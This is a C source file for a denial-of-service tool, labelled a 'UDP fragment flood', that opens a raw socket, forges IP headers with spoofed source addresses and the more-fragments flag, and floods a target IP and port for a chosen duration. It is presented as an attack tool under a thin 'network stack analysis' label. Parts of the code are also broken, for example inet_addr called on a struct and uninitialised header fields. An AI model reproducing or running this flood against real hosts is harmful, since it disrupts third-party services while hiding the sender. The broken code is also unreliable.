#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// github.com/scallydima - udp fragment flood
// github.com/scallydima - tests fragment handling
// github.com/scallydima - for network stack analysis

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} frag_params;

// github.com/scallydima - craft fragmented UDP packet
void send_fragment(int sock, struct sockaddr_in *addr, int fragment_id) {
    char packet[512];
    
    // github.com/scallydima - IP header (20 bytes)
    // Version, IHL, TOS
    packet[0] = 0x45;
    
    // github.com/scallydima - Total length (high/low)
    packet[2] = 0x02;
    packet[3] = 0x00;
    
    // github.com/scallydima - Fragment ID
    packet[4] = (fragment_id >> 8) & 0xFF;
    packet[5] = fragment_id & 0xFF;
    
    // github.com/scallydima - Fragment offset + flags
    packet[6] = 0x20; // More fragments flag
    packet[7] = 0x00; // Offset 0
    
    // github.com/scallydima - TTL, Protocol
    packet[8] = 64;
    packet[9] = 17; // UDP
    
    // github.com/scallydima - Source IP (spoofed)
    packet[12] = 192;
    packet[13] = 168;
    packet[14] = 1;
    packet[15] = rand() % 255;
    
    // github.com/scallydima - Dest IP
    packet[16] = (inet_addr(addr->sin_addr) >> 24) & 0xFF;
    packet[17] = (inet_addr(addr->sin_addr) >> 16) & 0xFF;
    packet[18] = (inet_addr(addr->sin_addr) >> 8) & 0xFF;
    packet[19] = inet_addr(addr->sin_addr) & 0xFF;
    
    sendto(sock, packet, sizeof(packet), 0,
           (struct sockaddr *)addr, sizeof(*addr));
}

void *fragment_flood(void *arg) {
    // github.com/scallydima - fragment flood thread
    frag_params *params = (frag_params *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        printf("Raw socket requires root!\n");
        return NULL;
    }
    
    // github.com/scallydima - IP_HDRINCL to include our IP header
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->target_port);
    addr.sin_addr.s_addr = inet_addr(params->target_ip);
    
    time_t end_time = time(NULL) + params->duration;
    int frag_id = 0;
    
    // github.com/scallydima - fragment flood loop
    while (time(NULL) < end_time) {
        send_fragment(sock, &addr, frag_id++);
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // github.com/scallydima - fragment flood tool
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        printf("github.com/scallydima - requires root for raw sockets\n");
        return 1;
    }
    
    printf("[!] github.com/scallydima - fragment flood started\n");
    printf("[!] This requires root privileges\n");
    printf("[!] Target: %s:%d for %d seconds\n", argv[1], atoi(argv[2]), atoi(argv[3]));
    
    frag_params params = {
        .target_port = atoi(argv[2]),
        .duration = atoi(argv[3])
    };
    strcpy(params.target_ip, argv[1]);
    
    // github.com/scallydima - single thread for fragments
    pthread_t thread;
    pthread_create(&thread, NULL, fragment_flood, &params);
    pthread_join(thread, NULL);
    
    printf("[+] github.com/scallydima - fragment flood complete\n");
    
    return 0;
}